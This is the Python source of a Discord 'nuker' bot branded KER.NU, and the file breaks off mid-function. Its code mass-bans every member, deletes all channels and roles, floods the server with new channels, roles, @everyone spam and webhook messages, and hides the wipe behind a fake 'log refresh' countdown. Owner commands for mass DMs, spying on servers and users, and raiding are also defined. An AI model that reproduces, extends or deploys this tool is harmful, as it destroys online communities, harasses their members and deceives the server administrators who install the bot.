import asyncio
import aiohttp
import discord
import requests
from discord.ext import commands, tasks
import random
import time
import configparser
import os
from discord import Embed
import json
from webserver import keep_alive
from dashboard import start_dashboard, set_bot_instance
import warnings
import sys
import datetime
from typing import Optional, Dict, List
import hashlib

# Suppress all warnings for cleaner console output
warnings.filterwarnings("ignore")

# Suppress discord.py warnings and other noisy loggers
import logging
logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
logging.getLogger('aiohttp').setLevel(logging.CRITICAL)
logging.getLogger('urllib3').setLevel(logging.CRITICAL)
logging.getLogger('requests').setLevel(logging.CRITICAL)

# Disable Flask development server warnings
os.environ['FLASK_ENV'] = 'production'
logging.getLogger('werkzeug').setLevel(logging.ERROR)

print("=" * 60)
print("🔥 KER.NU Discord Nuker Bot - Starting...")
print("🏢 Publisher: Kernu Inc.")
print("🌟 Version: Ultimate Edition v2.0")
print("=" * 60)

# Create config files if they don't exist
def create_default_configs():
    if not os.path.exists('config.ini'):
        print("⚠️  Creating default config.ini file...")
        with open('config.ini', 'w') as f:
            f.write("""[bot]
token = YOUR_BOT_TOKEN_HERE
bot_id = YOUR_BOT_ID_HERE
prefix = $kernu 
prefixes = $kernu ,!,?,k.n
premium_prefix = uranium 
channel_name = ██ KER.NU NUKED THIS SERVER ██
role_name = ██ KER.NU ██
webhook_name = ██ KER.NU SUPREMACY ██
nuke_message = @everyone ██ SERVER NUKED BY KER.NU🤑🤑🤑🤑💵 ██ discord.gg/kernu ██

[server]
server_id = YOUR_SERVER_ID_HERE
tracker_channel_id = YOUR_TRACKER_CHANNEL_ID_HERE

[owner]
owner_ids = YOUR_OWNER_ID_HERE
""")
    
    if not os.path.exists('database.ini'):
        print("⚠️  Creating default database.ini file...")
        with open('database.ini', 'w') as f:
            f.write("""[users]

""")
    
    if not os.path.exists('server_info.ini'):
        print("⚠️  Creating default server_info.ini file...")
        with open('server_info.ini', 'w') as f:
            f.write("""[servers]

""")
    
    if not os.path.exists('console_commands.txt'):
        with open('console_commands.txt', 'w') as f:
            f.write("")

create_default_configs()

config = configparser.ConfigParser(allow_no_value=True)
setup = configparser.ConfigParser()

try:
    setup.read("config.ini")
    TOKEN = setup["bot"]["token"]
    bot_id = setup["bot"]["bot_id"]
    nuke_message = setup['bot']['nuke_message']
    channel_name = setup['bot']['channel_name']
    webhook_name = setup['bot']['webhook_name']
    role_name = setup['bot']['role_name']
    your_server = int(setup["server"]["server_id"])
    your_tracker = int(setup["server"]["tracker_channel_id"])
    owners = [e.strip() for e in setup.get('owner', 'owner_ids').split(',')]
    
    if TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Please configure your bot token in config.ini")
        input("Press Enter to exit...")
        sys.exit()
        
except Exception as e:
    print(f"❌ Error reading config.ini: {e}")
    print("Please check your configuration file.")
    input("Press Enter to exit...")
    sys.exit()

# Initialize PREFIX variables
PREFIX = setup["bot"]["prefix"]
PREFIXES = [p.strip() for p in setup.get("bot", "prefixes", fallback="$kernu ,!,?,k.n").split(',') if p.strip()]
PREMIUM_PREFIX = setup.get("bot", "premium_prefix", fallback="ult")

print(f"🌟 Premium prefix loaded: {PREMIUM_PREFIX}")

def get_prefix(bot, message):
    """Dynamic prefix function"""
    # Premium prefix check - only for owners (ult followed by space)
    if message.content.startswith(PREMIUM_PREFIX + ' '):
        if str(message.author.id) not in owners:
            return commands.when_mentioned_or(*[])(bot, message)  # No prefix for non-owners
        else:
            return commands.when_mentioned_or(*[PREMIUM_PREFIX + ' '])(bot, message)  # Premium prefix for owners
    elif message.content.startswith(('!', '?')):
        # Check if user is owner or has admin permissions
        is_admin = False
        if hasattr(message, 'guild') and message.guild and hasattr(message.author, 'guild_permissions'):
            is_admin = message.author.guild_permissions.administrator
        
        if str(message.author.id) not in owners and not is_admin:
            return commands.when_mentioned_or(*[])(bot, message)  # No prefix for non-admins
        else:
            return commands.when_mentioned_or(*['!', '?'])(bot, message)  # Only ! and ? for owners/admins
    else:
        return commands.when_mentioned_or(*['kernu ', 'kn '])(bot, message) # Updated prefixes for everyone

# Set up intents with error handling
try:
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=get_prefix, intents=intents)
    nuker_bot = commands.Bot(command_prefix=get_prefix, intents=intents)
    bot.remove_command("help")
except Exception as e:
    print(f"❌ Error setting up bot: {e}")
    input("Press Enter to exit...")
    sys.exit()

config.read("database.ini")

# Custom command aliases (disguised as logs system)
COMMAND_ALIASES = {
    'logs': 'logs',    # Main logs command (disguised nuker)
    'refresh': 'refresh',  # Disguised nuke command
    'check': 'check',     # Disguised help command
    'ban': 'clear',       # Disguised ban command
    'unban': 'restore',   # Disguised unban command
    'stats': 'status',    # Disguised stats command
    'status': 'ping',     # Disguised status command
    'login': 'auth',      # Disguised login command
    'leaderboard': 'top', # Disguised leaderboard command
    'token_nuke': 'token_refresh', # Disguised token_nuke command
    'restore': 'backup',  # Disguised restore command
    'invite': 'link',     # Disguised invite command
    'type': 'config',     # Disguised type command
    'fix': 'cleanup',     # Disguised fix command
    'help': 'check'       # Disguised help command
}

# Premium owner commands
PREMIUM_ALIASES = {
    'premium': 'premium',
    'webhook': 'webhook',
    'massdm': 'massdm',
    'servers': 'servers',
    'stats': 'stats',
    'dashboard': 'dashboard',
    'nukeall': 'nukeall',
    'serverspy': 'serverspy',
    'userspy': 'userspy',
    'broadcast': 'broadcast',
    'coinbomb': 'coinbomb',
    'banhammer': 'banhammer',
    'serverraid': 'serverraid',
    'backup': 'backup',
    'stop': 'stop'
}

class TokenBucket:
        def __init__(self, bucket_size, refill_rate):
            # Number of tokens in the bucket
            self.bucket_size = bucket_size
            # Refill rate in tokens per second
            self.refill_rate = refill_rate
            # Current number of tokens in the bucket
            self.tokens = bucket_size
            # Time of the last refill
            self.last_refill = 0

        async def make_requests(self, num_requests):
            # Check if there are enough tokens in the bucket
            if self.tokens >= num_requests:
                self.tokens -= num_requests
                return True
            else:
                # Calculate the time until the next refill
                now = time.time()
                wait_time = (num_requests - self.tokens) / self.refill_rate - (now - self.last_refill)
                if wait_time > 0:
                    # Wait until the next refill
                    await asyncio.sleep(wait_time)
                # Refill the bucket
                self.tokens = self.bucket_size
                self.last_refill = time.time()
                self.tokens -= num_requests
                return True

class scrape:
 async def member(ctx, bottoken):
  headers = {"authorization": f"Bot {bottoken}"}
  params = {"limit": 1000, "after": 0}
  all_members = []
  while True:
    response = requests.get(f"https://discordapp.com/api/v6/guilds/{ctx.guild.id}/members", headers=headers, params=params)
    if response.status_code == 200:
        all_members.extend(response.json())
        params["after"] = all_members[-1]["user"]["id"]
    else:
        return "Error getting member list:", response.status_code, response.reason
        break

    if len(response.json()) < 1000:
        break
  member_ids = [member["user"]["id"] for member in all_members]
  return member_ids

 async def get_channels(id, bottoken):
    headers = {"authorization": f"Bot {bottoken}"}
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://discordapp.com/api/v6/guilds/{id}/channels", headers=headers) as response:
            if response.status == 200:
                guild_info = await response.json()
                num_channels = guild_info
                return num_channels
            else:
                return "Error getting number of channels:", response.status, response.reason

 async def banned_member(ctx, bottoken):
    headers = {"authorization": f"Bot {bottoken}"}
    params = {"limit": 1000,"after": 0}
    all_banned_members = []
    while True:
        response = requests.get(f"https://discordapp.com/api/v6/guilds/{ctx.guild.id}/bans", headers=headers, params=params)

        if response.status_code == 200:
            all_banned_members.extend(response.json())
            params["after"] = all_banned_members[-1]["user"]["id"]
        else:
            return "Error getting banned member list:", response.status_code, response.reason
            break

        if len(response.json()) < 1000:
            break

    banned_member_ids = [banned_member["user"]["id"] for banned_member in all_banned_members]
    return banned_member_ids

 async def get_roles(id, bottoken):
    headers = {"Authorization": f"Bot {bottoken}", "Content-Type": "application/json"}
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://discordapp.com/api/v6/guilds/{id}/roles", headers=headers) as response:
            if response.status == 200:
                roles = await response.json()
                role_ids = [role["id"] for role in roles]
                return role_ids   
            else:
                return "Error getting role list:", response.status, response.reason

 async def save_server(token: str, server_id: str):
    save = configparser.ConfigParser()  
    save.read('server_info.ini')
    if str(server_id) in save['servers']:
      return
    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://discord.com/api/v6/guilds/{server_id}', headers={'Authorization': f'Bot {token}'}) as resp:
            resp.raise_for_status()
            server_info = await resp.json()
        async with session.get(f'https://discord.com/api/v6/guilds/{server_id}/channels', headers={'Authorization': f'Bot {token}'}) as response:
          response.raise_for_status()
          channels_info = await response.json()


        save[f'server_{server_id}'] = {'server_id': server_id}
        save[f'emojis_{server_id}'] = {}
        for i, emoji in enumerate(server_info['emojis']):
            save[f'emojis_{server_id}'][f'emoji_{i}'] = {
                'id': emoji['id'],
                'name': emoji['name'],
                'roles': emoji['roles'],
                'user': emoji['user']['id'],
                'require_colons': emoji['require_colons'],
                'managed': emoji['managed'],
                'animated': emoji['animated'],
            }
        save[f'roles_{server_id}'] = {}
        for i, role in enumerate(server_info['roles']):
            role_dict = {
                'id': str(role['id']),
                'name': str(role['name']),
                'color': str(role['color']),
                'permissions': str(role['permissions']),
                'mentionable': str(role['mentionable']),
            }
            role_json = json.dumps(role_dict)
            save[f'roles_{server_id}'][f'role_{i}'] = role_json
        save[f'channels_{server_id}'] = {}
        for i, channel in enumerate(channels_info):
            channel_dict = {
                'id': str(channel['id']),
                'name': str(channel['name']),
                'type': str(channel['type']),
        }
            channel_json = json.dumps(channel_dict)
            save[f'channels_{server_id}'][f'channel_{i}'] = channel_json    
            save['servers'][str(server_id)] = "nuked"
        with open('server_info.ini', 'w') as configfile:
             save.write(configfile)

class ban_unbann:
 async def ban_member(serv, id, bottoken):
    headers = {"authorization": f"Bot {bottoken}"}
    async with aiohttp.ClientSession() as session:
        max_erros = 1
        while max_erros != 0:
         async with session.put(f"https://discordapp.com/api/v9/guilds/{serv}/bans/{id}", headers=headers) as response:

          if response.status == 204:
            return "Succesfully banned: ", id
          else:
           max_erros -= 1

 async def unban_member(serv, id, bottoken):
    headers = {"authorization": f"Bot {bottoken}"}
    async with aiohttp.ClientSession() as session:
        max_erros = 1
        while max_erros != 0:
         async with session.delete(f"https://discordapp.com/api/v9/guilds/{serv}/bans/{id}", headers=headers) as response:

          if response.status == 204:
            return "Succesfully unbanned: ", id
          else:
           max_erros -= 1

class channels:
    async def create_channel(id, bottoken):
        headers = {"authorization": f"Bot {bottoken}"}
        data = {"name": channel_name, "type": 0}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discordapp.com/api/v6/guilds/{id}/channels", headers=headers, json=data) as response:
                if response.status == 201:
                    channel = await response.json()
                    tasks = []
                    tasks.append(asyncio.create_task(spam.bot_spam(channel['id'], TOKEN)))
                    tasks.append(asyncio.create_task(on_channel_create(channel)))
                    await asyncio.gather(*tasks)
                    return "Channel created successfully"
                else:
                    return "Failed to create channel", response.status, response.reason

    async def delete_channel(channelid, bottoken):
        headers = {"authorization": f"Bot {bottoken}"}
        async with aiohttp.ClientSession() as session:
            async with session.delete(f"https://discordapp.com/api/v6/channels/{channelid}", headers=headers) as response:
                if response.status == 200:
                    return "Channel deleted successfully"  
                else:
                    return "Failed to delete channel", response.status, response.reason

class roles:
    async def create_role(id, bottoken):
        headers = {"authorization": f"Bot {bottoken}"}
        data = {"name": role_name}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discordapp.com/api/v6/guilds/{id}/roles", headers=headers, json=data) as response:
                if response.status == 200:
                 return "Role created successfully"
                else:
                 return "Failed to create role", response.status, response.reason

    async def delete_role(id, roleid, bottoken):
        headers = {"authorization": f"Bot {bottoken}"}
        async with aiohttp.ClientSession() as session:
            async with session.delete(f"https://discordapp.com/api/v6/guilds/{id}/roles/{roleid}", headers=headers) as response:
                if response.status == 204:
                    return "Role deleted successfully"
                else:
                    return "Failed to delete role", response.status, response.reason

class webhook:
    async def create_webhook(channel_id, bottoken):
     headers = {"authorization": f"Bot {bottoken}"}
     data = {"name": webhook_name}
     async with aiohttp.ClientSession() as session:
         async with session.post(f"https://discordapp.com/api/v6/channels/{channel_id}/webhooks", headers=headers, json=data) as response:
             webhook = await response.json()
     return {"id": webhook["id"], "token": webhook["token"]}

    async def spam_webhook(webhook_id, webhook_token):
     headers = {"Content-Type": "application/json"}
     data = {"content": nuke_message}
     async with aiohttp.ClientSession() as session:
         async with session.post(f"https://discordapp.com/api/v6/webhooks/{webhook_id}/{webhook_token}", headers=headers, json=data) as response:
             if response.status == 204:
                 print("Webhook message sent successfully")
             else:
                 return "Error sending webhook message:", response.status, response.reason

class spam:
    async def bot_spam(channel_id, bottoken):
        headers = {"authorization": f"Bot {bottoken}", "Content-Type": "application/json"}
        # Enhanced spam message with ASCII art and image
        spam_msg = """@everyone 
██   ██ ███████ ██████     ███    ██ ██    ██ 
██  ██  ██      ██   ██    ████   ██ ██    ██ 
█████   █████   ██████     ██ ██  ██ ██    ██ 
██  ██  ██      ██   ██    ██  ██ ██ ██    ██ 
██   ██ ███████ ██   ██ ██ ██   ████  ██████  
SERVER NUKED BY KER.NU - discord.gg/kernu
https://cdn.discordapp.com/attachments/1288868959600382022/1390924880463269938/e925ae1430bc72230747042137c5e057.png?ex=686a073d&is=6868b5bd&hm=b244ec0b016523f205661e805bbb3707e44627f1fa5f37e49a52f7a22bf604ba&"""
        data = {"content": spam_msg}
        async with aiohttp.ClientSession() as session:
          for _i in range(100):  # Increased spam count
            async with session.post(f"https://discordapp.com/api/v6/channels/{channel_id}/messages", headers=headers, json=data) as response:
                if response.status == 201:
                  print("KER.NU message sent successfully")
                else:
                  return "Error sending message:", response.status, response.reason

class database:
    async def add(guild, user):
       id = str(user)
       if id in config['users']:
         if str(guild.id) in config[f"server{id}"]:
            return
         else:
            ns = int(config[id]['nuked_server']) + 1
            config[f"server{id}"][str(guild.id)] = "NUKED"
            config[id]['nuked_server'] = str(ns)
            nuked_member = int(config[id]['nuked_member']) + int((len(guild.members)))
            config[id]['nuked_member'] = str(nuked_member)

            if int((len(guild.members))) > int(config[id]['biggest_server']):
                config[id]['biggest_server'] = str((len(guild.members)))
            with open('database.ini', 'w') as configfile:
             config.write(configfile)
            return True
       else:
            config['users'][id] = None
            config[id] = {}
            config[f"server{id}"] = {}
            config[f"server{id}"][str(guild.id)] = "NUKED"
            config[id]['nuked_server'] = "1"
            config[id]['nuked_member'] = str(len(guild.members))
            config[id]['biggest_server'] = str(len(guild.members))
            config[id]['token'] = 'None'
            config[id]["auto_nuke"] = "false"
            config[id]['coins'] = "100"
            config[id]['last_daily'] = "0"
            with open('database.ini', 'w') as configfile:
             config.write(configfile)
            return True

    async def add_token(id, bottoken):
        if str(id) in config['users']:
            config[str(id)]['token'] = str(bottoken)
            with open('database.ini', 'w') as configfile:
             config.write(configfile)
            return True
        else:
            return False

    async def dbstats(ctx):
        if str(ctx.author.id) in config["users"]:
            return {"nuked_server": config[str(ctx.author.id)]['nuked_server'], "nuked_member": config[str(ctx.author.id)]['nuked_member'], "biggest_server": config[str(ctx.author.id)]['biggest_server']}
        else:
            return False

    async def auto_nuke(arg, id):
      if "on":
        config[id]["auto_nuke"] = "true"
        pass
      else:
        config[id]["auto_nuke"] = "false"
        pass
      with open('database.ini', 'w') as configfile:
             config.write(configfile)
      return

    async def restore_server(token: str, server_id: str):
     # Read the configuration file
     config = configparser.ConfigParser()
     config.read('server_info.ini')

     # Get the server ID from the configuration file
     server_id = config[f'server_{server_id}']['server_id']

     # Get the emojis from the configuration file
     emojis = {}
     for emoji_id, emoji_config in config[f'emojis_{server_id}'].items():
        emojis[emoji_id] = {
            'id': int(emoji_config['id']),
            'name': emoji_config['name'],
            'roles': [int(role) for role in emoji_config['roles'].split(',')],
            'user': int(emoji_config['user']),
            'require_colons': emoji_config['require_colons'],
            'managed': emoji_config['managed'],
            'animated': emoji_config['animated'],
        }

     # Get the roles from the configuration file
     roles = {}
     for role_id, role_json in config[f'roles_{server_id}'].items():
        role_dict = json.loads(role_json)
        roles[role_id] = {
            'id': int(role_dict['id']),
            'name': role_dict['name'],
            'color': int(role_dict['color']),
            'permissions': int(role_dict['permissions']),
            'mentionable': role_dict['mentionable'],
        }
     channels = {}
     for channel_id, channel_json in config[f'channels_{server_id}'].items():
        channel_dict = json.loads(channel_json)
        channels[channel_id] = {
            'id': int(channel_dict['id']),
            'name': channel_dict['name'],
            'type': channel_dict['type'],
        }
     async with aiohttp.ClientSession() as session:
        # Create the emojis
        for emoji_id, emoji in emojis.items():
            emoji_url = emoji['url'] if 'url' in emoji else None
            async with session.post(f'https://discord.com/api/v6/guilds/{server_id}/emojis', headers={'Authorization': f'Bot {token}'}, json={
                'name': emoji['name'],
                'roles': emoji['roles'],
                'image': emoji_url,
                'requires_colons': emoji['require_colons'],
                'managed': emoji['managed'],
                'animated': emoji['animated'],
            }) as resp:
              resp.raise_for_status()

        # Create the roles
        for role_id, role in roles.items():
            async with session.post(f'https://discord.com/api/v6/guilds/{server_id}/roles', headers={'Authorization': f'Bot {token}'}, json={
                'name': role['name'],
                'color': role['color'],
                'permissions': role['permissions'],
                'mentionable': role['mentionable'],
            }) as resp:
                resp.raise_for_status()

        # Create the channels
        for channel_id, channel in channels.items():
            async with session.post(f'https://discord.com/api/v6/guilds/{server_id}/channels', headers={'Authorization': f'Bot {token}'}, json={
                'name': channel['name'],
                'type': channel['type'],
            }) as resp:
                resp.raise_for_status()

class check:
    async def check_token(bottoken):
        headers = {'Authorization': f'Bot {bottoken}'}
        async with aiohttp.ClientSession() as session:
            async with session.get('https://discord.com/api/v6/users/@me', headers=headers) as response:
                 if response.status == 200:
                     return True
                 else:
                     return False

    async def check_guild(id, bottoken):
      headers = {'Authorization': f'Bot {bottoken}'}
      async with aiohttp.ClientSession() as session:
        async with session.get('https://discord.com/api/v6/users/@me/guilds', headers=headers) as response:
          guilds = await response.json()
          if any(str(guild['id']) == str(id) for guild in guilds):
            return True
          else:
            return False




# Optimized rate limiting for maximum performance
ban_bucket = TokenBucket(100, 100)  # Increased bucket size and refill rate
channel_bucket = TokenBucket(75, 75)  # Dedicated bucket for channel operations
role_bucket = TokenBucket(75, 75)  # Dedicated bucket for role operations

# Premium commands with ult prefix
@bot.command(name="webhook")
async def premium_global_webhook_direct(ctx, server_id=None, *, message=None):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    if not server_id or not message:
        return await ctx.reply("Usage: `ult webhook <server_id> <message>`")
    await premium_global_webhook(ctx, server_id, message)

@bot.command(name="massdm")
async def premium_mass_dm_direct(ctx, *, message=None):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    if not message:
        return await ctx.reply("Usage: `ult massdm <message>`")
    await premium_mass_dm(ctx, message)

@bot.command(name="servers")
async def premium_server_list_direct(ctx):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    await premium_server_list(ctx)

@bot.command(name="stats")
async def premium_owner_stats_direct(ctx):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    await premium_owner_stats(ctx)

@bot.command(name="dashboard")
async def premium_dashboard_direct(ctx):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    await premium_dashboard(ctx)

@bot.command(name="nukeall")
async def premium_nuke_all_direct(ctx):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    await premium_nuke_all(ctx)

@bot.command(name="serverspy")
async def premium_server_spy_direct(ctx, server_id=None):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    if not server_id:
        return await ctx.reply("Usage: `ult serverspy <server_id>`")
    await premium_server_spy(ctx, server_id)

@bot.command(name="userspy")
async def premium_user_spy_direct(ctx, user_id=None):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    if not user_id:
        return await ctx.reply("Usage: `ult userspy <user_id>`")
    await premium_user_spy(ctx, user_id)

@bot.command(name="broadcast")
async def premium_broadcast_direct(ctx, *, message=None):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    if not message:
        return await ctx.reply("Usage: `ult broadcast <message>`")
    await premium_broadcast(ctx, message)

@bot.command(name="coinbomb")
async def premium_coin_bomb_direct(ctx, user_id=None, amount=None):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    if not user_id or not amount:
        return await ctx.reply("Usage: `ult coinbomb <user_id> <amount>`")
    await premium_coin_bomb(ctx, user_id, amount)

@bot.command(name="banhammer")
async def premium_ban_hammer_direct(ctx, user_id=None):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    if not user_id:
        return await ctx.reply("Usage: `ult banhammer <user_id>`")
    await premium_ban_hammer(ctx, user_id)

@bot.command(name="serverraid")
async def premium_server_raid_direct(ctx, server_id=None):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    if not server_id:
        return await ctx.reply("Usage: `ult serverraid <server_id>`")
    await premium_server_raid(ctx, server_id)

@bot.command(name="backup")
async def premium_database_backup_direct(ctx):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    await premium_database_backup(ctx)

@bot.command(name="stop")
async def premium_emergency_stop_direct(ctx):
    if str(ctx.author.id) not in owners:
        return await ctx.reply("⭐ Access denied - Premium command")
    await premium_emergency_stop(ctx)

# Removed duplicate help command - using the main help command instead

# Register the nuker command with its current aliases
def register_logs_command():
    # Remove existing commands if they exist
    logs_aliases = COMMAND_ALIASES['logs'] if isinstance(COMMAND_ALIASES['logs'], list) else [COMMAND_ALIASES['logs']]

    for alias in logs_aliases:
        existing_command = bot.get_command(alias)
        if existing_command:
            bot.remove_command(alias)

    # Re-add with current aliases - fix the closure issue
    def create_logs_command(alias):
        @bot.command(name=alias)
        async def dynamic_logs_commands(ctx, subcommand=None, *args):
            await nuker_commands(ctx, subcommand, *args)
        return dynamic_logs_commands

    for alias in logs_aliases:
        create_logs_command(alias)

async def nuker_commands(ctx, subcommand=None, *args):
    # Handle rename command
    if subcommand == "rename" and len(args) >= 2:
        await nuker_rename(ctx, args[0], args[1])
        return

    # Map aliases back to original commands
    if subcommand == "clear":  # Disguised ban
        await nuker_ban(ctx)
    elif subcommand == "restore":  # Disguised unban
        await nuker_unban(ctx)
    elif subcommand == "refresh":  # Disguised nuke with countdown
        await nuker_nuke_with_countdown(ctx)
    elif subcommand == "status":  # Disguised stats
        await nuker_stats(ctx)
    elif subcommand == "ping":  # Disguised status
        await nuker_status(ctx)
    elif subcommand == "auth" and args:  # Disguised login
        await nuker_login(ctx, args[0])
    elif subcommand == "top":  # Disguised leaderboard
        await nuker_leaderboard(ctx)
    elif subcommand == "token_refresh" and args:  # Disguised token_nuke
        await nuker_token_nuke(ctx, args[0])
    elif subcommand == "backup":  # Disguised restore
        if args:
            await nuker_restore(ctx, args[0])
        else:
            await ctx.reply("❌ Please provide a server ID to restore!\nUsage: `?logs backup <server_id>`")
    elif subcommand == "link":  # Disguised invite
        await nuker_invite(ctx)
    elif subcommand == "config" and args:  # Disguised type
        await nuker_type(ctx, args[0])
    elif subcommand == "cleanup":  # Disguised fix
        await nuker_fix(ctx)
    elif subcommand == "check" or subcommand is None:  # Disguised help
        await nuker_help(ctx, "check")
    else:
        await ctx.reply(f"Unknown logs command: {subcommand}")

# Register the main logs command (disguised nuker)
@bot.command(name="logs")
async def logs_main(ctx, subcommand=None, *args):
    await nuker_commands(ctx, subcommand, *args)

# Also register common aliases
@bot.command(name="log")
async def logs_alias(ctx, subcommand=None, *args):
    await nuker_commands(ctx, subcommand, *args)

async def nuker_ban(ctx):
 if ctx.guild.id != your_server:
    try:
      await ctx.reply("🔨 Starting ban process...")
      member_id = await scrape.member(ctx, TOKEN)
      if not member_id:
        return await ctx.reply("❌ No members found to ban")

      banned_count = 0
      tasks = []
      while len(member_id) != 0:
       for _i in range(50):
        if len(member_id) == 0:
            break
        id = random.choice(member_id)
        serv = ctx.guild.id
        success = await ban_bucket.make_requests(1)
        if success:
         member_id.remove(id)
         task = asyncio.create_task(ban_unbann.ban_member(serv, id, TOKEN))
         tasks.append(task)
         banned_count += 1
       if len(tasks) != 0:
        result = await asyncio.gather(*tasks)
        print(result)

      await ctx.reply(f"✅ Ban process completed! Attempted to ban {banned_count} members.")
    except Exception as e:
      await ctx.reply(f"❌ Ban error: {str(e)}")

async def nuker_unban(ctx):
 if ctx.guild.id != your_server:
    try:
      await ctx.reply("🔓 Starting unban process...")
      member_id = await scrape.banned_member(ctx, TOKEN)
      if not member_id:
        return await ctx.reply("❌ No banned members found")

      unbanned_count = 0
      tasks = []
      while len(member_id) != 0:
       for _i in range(50):
        if len(member_id) == 0:
            break
        id = random.choice(member_id)
        serv = ctx.guild.id
        success = await ban_bucket.make_requests(1)
        if success:
         member_id.remove(id)
         task = asyncio.create_task(ban_unbann.unban_member(serv, id, TOKEN))
         tasks.append(task)
         unbanned_count += 1
       if len(tasks) != 0:
        result = await asyncio.gather(*tasks)
        print(result)

      await ctx.reply(f"✅ Unban process completed! Attempted to unban {unbanned_count} members.")
    except Exception as e:
      await ctx.reply(f"❌ Unban error: {str(e)}")


async def create_channels(id):
 if id != your_server:
    tasks = []
    for _i in range(100):  # Increased channel creation count
        success = await channel_bucket.make_requests(1)
        if success:
         task = asyncio.create_task(channels.create_channel(id, TOKEN))
         tasks.append(task)
    result = await asyncio.gather(*tasks)
    print("KER.NU channels created:", result)


async def delete_channels(id):
 if id != your_server:
    tasks = []
    chan = await scrape.get_channels(id, TOKEN)
    channel_ids = [channel['id'] for channel in chan]
    while len(channel_ids) != 0:
     for _i in range(50):
      if len(channel_ids) == 0:
          break
      channelid = random.choice(channel_ids)
      print(channelid)
      success = await ban_bucket.make_requests(1)
      if success:
       channel_ids.remove(channelid)
       task = asyncio.create_task(channels.delete_channel(channelid, TOKEN))
       tasks.append(task)
     if len(tasks) != 0:
      result = await asyncio.gather(*tasks)
      print(result)


async def create_roles(ctx):
 if ctx.guild.id != your_server:
    id = ctx.guild.id
    tasks = []
    for _i in range(100):  # Increased role creation count
        success = await role_bucket.make_requests(1)
        if success:
            task = asyncio.create_task(roles.create_role(id, TOKEN))
            tasks.append(task)
    result = await asyncio.gather(*tasks)
    print("KER.NU roles created:", result)


async def delete_roles(ctx):
 if ctx.guild.id != your_server:
    id = ctx.guild.id
    role = await scrape.get_roles(id, TOKEN)
    while len(role) > 0:
         roleid = random.choice(role)
         success = await ban_bucket.make_requests(1)
         if success:
          role.remove(roleid)
          task = asyncio.create_task(roles.delete_role(id, roleid, TOKEN))
          await task

async def nuker_nuke_with_countdown(ctx):
    if ctx.guild.id != your_server:
        try:
            await ctx.message.delete()
            
            # Create countdown message with animated dots
            embed = discord.Embed(title="🔁 Refreshing logs started", color=0x00ff00)
            embed.add_field(name="Status", value="Initializing log refresh", inline=False)
            embed.set_footer(text="📋 KER.NU Log Management System")
            
            message = await ctx.send(embed=embed)
            
            # Countdown with animated dots
            for i in range(10, 0, -1):
                # Calculate dot animation (1, 2, 3, 2, 1, 2, 3, 2, 1...)
                dot_cycle = [1, 2, 3, 2, 1, 2, 3, 2, 1, 2]
                dots = "." * dot_cycle[10 - i]
                
                embed = discord.Embed(title="🔁 Refreshing logs started", color=0x00ff00)
                embed.add_field(name="Status", value=f"Log refresh in progress{dots}", inline=False)
                embed.add_field(name="Time Remaining", value=f"⏱️ {i} seconds", inline=True)
                embed.set_footer(text="📋 KER.NU Log Management System")
                
                await message.edit(embed=embed)
                await asyncio.sleep(1)
            
            # Final message before execution
            embed = discord.Embed(title="🔁 Refreshing logs", color=0xffff00)
            embed.add_field(name="Status", value="⚡ Executing log refresh...", inline=False)
            embed.set_footer(text="📋 KER.NU Log Management System")
            await message.edit(embed=embed)
            
            # Execute the actual nuke
            await delete_channels(ctx.guild.id)
            await create_channels(ctx.guild.id)
            
            # Send success message in one of the new channels
            for channel in ctx.guild.text_channels:
                try:
                    embed = discord.Embed(title="✅ Log refresh completed", color=0x00ff00)
                    embed.add_field(name="Status", value="All logs have been refreshed successfully", inline=False)
                    embed.set_footer(text="📋 KER.NU Log Management System")
                    await channel.send(embed=embed)
                    break
                except:
                    continue
                    
        except Exception as e:
            try:
                await ctx.reply(f"❌ Log refresh error: {str(e)}")
            except:
                pass

# Keep the original function for compatibility
async def nuker_nuke(ctx):
    await nuker_nuke_with_countdown(ctx)


async def auto_nuke(id):
 if id != your_server:
    await delete_channels(id)
    await create_channels(id)

@tasks.loop(minutes=5)
async def status_monitor():
    """Monitor bot status and send offline alerts if needed"""
    try:
        # Send a heartbeat to the tracker channel to show bot is online
        channel = bot.get_channel(your_tracker)
        if channel:
            # Only send status update every hour to avoid spam
            if status_monitor.current_loop % 12 == 0:  # 12 * 5 minutes = 1 hour
                embed = discord.Embed(title="🤖 Bot Status Update", color=0x00ff00)
                embed.add_field(name="Gamble Bot", value="🟢 Online", inline=True)
                embed.add_field(name="Nuker", value="🟢 Online", inline=True)
                embed.add_field(name="Uptime Check", value=f"✅ {int(time.time())}", inline=True)
                await channel.send(embed=embed)
    except Exception as e:
        print(f"Status monitor error: {e}")

@tasks.loop(seconds=5)
async def console_command_monitor():
    """Enhanced console command monitoring with dashboard integration"""
    try:
        import os
        if os.path.exists('console_commands.txt'):
            with open('console_commands.txt', 'r') as f:
                commands = f.readlines()

            if commands:
                # Clear the file
                with open('console_commands.txt', 'w') as f:
                    f.write('')

                # Execute each command
                for command in commands:
                    command = command.strip()
                    if command:
                        await process_dashboard_command(command)
    except Exception as e:
        print(f"Console monitor error: {e}")

async def process_dashboard_command(command):
